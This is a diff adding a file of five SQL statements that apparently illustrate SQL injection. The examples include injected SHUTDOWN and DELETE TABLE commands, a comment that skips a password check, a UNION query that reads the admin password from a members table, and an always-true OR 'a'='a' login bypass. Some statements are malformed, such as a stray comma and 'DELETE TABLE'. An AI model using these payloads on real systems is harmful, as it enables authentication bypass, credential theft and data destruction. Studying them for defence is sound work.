@@ -1,0 +1,23 @@
+select Fname, Lname, Ssn
+from EMPLOYEE,
+where Salary > 30000 ';SHUTDOWN; -- ';
+
+select Fname, Lname, Ssn
+from EMPLOYEE,
+where Salary > 30000 ';DELETE TABLE; -- ';
+
+SELECT *
+FROM users
+WHERE username='admin' -- AND password='anyPassword
+
+SELECT description
+FROM products
+WHERE name ='z' AND 'a'='b'
+UNION
+SELECT password
+FROM members
+WHERE username='admin'
+
+SELECT *
+FROM users
+WHERE username='admin' AND password='wrongpassword' OR 'a'='a'
